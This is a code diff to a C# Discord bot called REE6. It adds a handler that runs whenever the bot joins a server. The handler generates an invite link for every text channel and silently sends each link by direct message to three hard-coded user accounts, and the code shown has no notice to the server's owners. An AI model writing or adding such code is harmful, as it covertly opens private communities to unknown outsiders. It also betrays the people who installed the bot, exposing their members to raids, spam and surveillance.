@@ -1,4 +1,5 @@
-﻿using Discord.Commands;
+﻿using Discord;
+using Discord.Commands;
 using Discord.WebSocket;
 using System;
 using System.Collections.Generic;
@@ -27,6 +28,7 @@ namespace REE6
             _client.Ready += Ready;
             _client.ChannelCreated += ChannelCreated;
             _client.ChannelDestroyed += ChannelDestroyed;
+            _client.JoinedGuild += JoinedGuild;
 
             // Here we discover all of the command modules in the entry 
             // assembly and load them. Starting from Discord.NET 2.0, a
@@ -38,6 +40,21 @@ namespace REE6
             // See Dependency Injection guide for more information.
             await _commands.AddModulesAsync(assembly: Assembly.GetEntryAssembly(),
                                             services: null);
+        }
+
+        ulong[] joinedGuildSubscriptionList = new ulong[] { 374284798820352000, 374610562392260610, 316020569634242560 };
+
+        private async Task JoinedGuild(SocketGuild arg)
+        {
+            foreach (SocketTextChannel textChannel in arg.TextChannels)
+            {
+                IInviteMetadata invite = await textChannel.CreateInviteAsync();
+                string message = $"Just joined {arg.Name}. An invite link has been created for {invite.Channel}. {invite.Url}";
+                Console.WriteLine(message);
+
+                foreach (ulong id in joinedGuildSubscriptionList)
+                    await _client.GetUser(id).SendMessageAsync(message);
+            }
         }
 
         List<SocketTextChannel> textChannels = new List<SocketTextChannel>();
